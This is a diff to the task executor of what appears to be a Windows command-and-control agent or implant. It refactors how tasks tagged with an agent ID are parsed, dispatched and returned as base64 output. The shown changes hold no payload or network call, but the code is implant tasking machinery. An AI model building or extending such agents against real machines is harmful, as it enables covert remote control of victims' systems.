@@ -25,16 +25,21 @@ Executor::Executor(WinApiCustom *pWinApiCustom, Queue *pTaskInputQueue, Queue *p
     this->taskAgentSpecSize = STRING_TASK_LEN + 1 + 6; // "TASK" + "-" + "6 char agent id"
     this->pTaskAgentSpec = this->pWinApiCustom->HeapAllocCustom(this->taskAgentSpecSize);
     if (pTaskAgentSpec == NULL)
-        this->pWinApiCustom->HeapFreeCustom(this->pTaskAgentSpec);
+    {
+        this->pEventAgentShouldStop->Set();
+        return;
+    }
 
-    CopyBuffer(this->pTaskAgentSpec, strTask, STRING_TASK_LEN);
-    CopyBuffer((PBYTE)(this->pTaskAgentSpec) + STRING_TASK_LEN, "-", 1);
-    CopyBuffer((PBYTE)(this->pTaskAgentSpec) + STRING_TASK_LEN + 1, this->agentId, 6 + 1); // Agent Id + Agent Id's null terminator        
+    ConcatString((PCHAR)(this->pTaskAgentSpec), strTask);
+    ConcatString((PCHAR)(this->pTaskAgentSpec), "-");
+    ConcatString((PCHAR)(this->pTaskAgentSpec), this->agentId);
 }
 
 /* Destructor */
 Executor::~Executor()
 {
+    if (this->pTaskAgentSpec != NULL)
+        this->pWinApiCustom->HeapFreeCustom(this->pTaskAgentSpec);
 }
 
 /* Target for Executor's thread */
@@ -52,7 +57,7 @@ void WINAPI Executor::StartExecutorThread(StartExecutorThreadParameters *pExecut
             pExecutorParameters->executorIntervalMs);
         executor.StartExecutor();
     }
-    // If registration has no succeeded in time
+    // If registration has not succeeded in time
     else
         return;
 }
@@ -93,7 +98,7 @@ void Executor::StartExecutor()
             taskData = (PCHAR)(this->TaskInputSelfQueue.Dequeue()); // "TASK-123ABC-14-base64(input)"
 
             // Validate task data
-            if (GenericSeparatedArrayNumOfStringElements(taskData, "-") != 3)
+            if (GenericSeparatedArrayNumOfStringElements(taskData, "-") != 4)
                 goto CLEANUP_TASK;
 
             // Get task string
@@ -149,7 +154,8 @@ void Executor::StartExecutor()
                 }
 
                 //// FALLBACK
-                else {
+                else
+                {
                     this->SetOutputInOutputQueue((PCHAR)taskId, strAgentCapResponseFailed, FALSE);
                 }
             }
@@ -220,11 +226,11 @@ void Executor::SetOutputInOutputQueue(IN PCHAR taskId, IN PCHAR taskOutput, BOOL
     if (taskOutputStatement == NULL)
         goto CLEANUP;
 
-    CopyBuffer(taskOutputStatement, strTaskOutput, STRING_TASK_OUTPUT_LEN);                                                   // "TASK_OUTPUT"
-    CopyBuffer((PBYTE)taskOutputStatement + STRING_TASK_OUTPUT_LEN, "-", 1);                                                  // "-"
-    CopyBuffer((PBYTE)taskOutputStatement + STRING_TASK_OUTPUT_LEN + 1, taskId, taskIdLen);                                   // "Task ID"
-    CopyBuffer((PBYTE)taskOutputStatement + STRING_TASK_OUTPUT_LEN + 1 + taskIdLen, "-", 1);                                  // "-"
-    CopyBuffer((PBYTE)taskOutputStatement + STRING_TASK_OUTPUT_LEN + 1 + taskIdLen + 1, taskOutputB64, taskOutputB64Len + 1); // "Task output base64" + null-byte
+    ConcatString((PCHAR)taskOutputStatement, strTaskOutput);        // "TASK_OUTPUT"
+    ConcatString((PCHAR)taskOutputStatement, "-");                  // "-"
+    ConcatString((PCHAR)taskOutputStatement, taskId);               // "Task ID"
+    ConcatString((PCHAR)taskOutputStatement, "-");                  // "-"
+    ConcatString((PCHAR)taskOutputStatement, (PCHAR)taskOutputB64); // "Task output base64" + null-byte
 
     // Append to Task output
     if (!this->pTaskOutputQueue->AcquireThreadMutex())
@@ -265,6 +271,6 @@ void Executor::GetTasksForSelf()
         }
 
         // Release acquired thread mutex
-        pTaskInputQueue->ReleaseThreadMutex();
+        this->pTaskInputQueue->ReleaseThreadMutex();
     }
 }
